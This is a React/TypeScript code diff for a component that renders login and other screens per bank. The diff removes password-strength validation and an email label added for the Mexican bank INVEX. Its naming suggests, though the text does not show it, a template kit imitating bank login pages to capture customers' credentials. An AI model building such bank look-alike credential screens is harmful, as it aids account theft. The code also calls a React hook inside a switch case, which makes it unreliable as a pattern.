@@ -164,34 +164,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(folioContent);
 
       case ScreenType.LOGIN:
-        // Validación especial para Invex
-        const isInvex = banco === 'INVEX';
-        
-        // Función para validar contraseña de Invex
-        const validateInvexPassword = (password: string) => {
-          if (!password) return false;
-          
-          // Debe tener al menos 8 caracteres, una mayúscula, un número y un caracter especial
-          const hasUpperCase = /[A-Z]/.test(password);
-          const hasNumber = /[0-9]/.test(password);
-          const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
-          
-          return hasUpperCase && hasNumber && hasSpecialChar;
-        };
-        
         // Estado para errores de validación
         const [passwordError, setPasswordError] = useState<string | null>(null);
         
         // Función para manejar el clic en el botón de ingresar
         const handleLoginSubmit = () => {
-          // Para Invex, validar la contraseña
-          if (isInvex) {
-            if (!validateInvexPassword(loginInputs.password)) {
-              setPasswordError("La contraseña debe contener al menos una letra mayúscula, un número y un carácter especial.");
-              return;
-            }
-          }
-          
           // Si llegamos aquí, todo está bien
           setPasswordError(null);
           onSubmit(ScreenType.LOGIN, { 
@@ -206,13 +183,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div className="mb-4">
               <div className="flex flex-col items-start mb-2">
                 <label className="text-sm text-gray-700 mb-1">
-                  {isInvex ? "Correo:" : "Usuario o ID de cliente:"}
+                  Usuario o ID de cliente:
                 </label>
                 <Input 
                   type="text" 
                   value={loginInputs.username}
                   onChange={(e) => setLoginInputs({...loginInputs, username: e.target.value})}
-                  placeholder={isInvex ? "Correo electrónico" : "Usuario"}
+                  placeholder="Usuario"
                   className="w-full p-2 border border-gray-300 rounded"
                 />
               </div>
@@ -230,11 +207,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   placeholder="Contraseña"
                   className={`w-full p-2 border rounded ${passwordError ? 'border-red-500' : 'border-gray-300'}`}
                 />
-                {isInvex && (
-                  <p className="text-xs text-gray-600 mt-1">
-                    La contraseña debe incluir al menos una letra mayúscula, un número y un carácter especial.
-                  </p>
-                )}
                 {passwordError && (
                   <p className="text-xs text-red-500 mt-1">{passwordError}</p>
                 )}
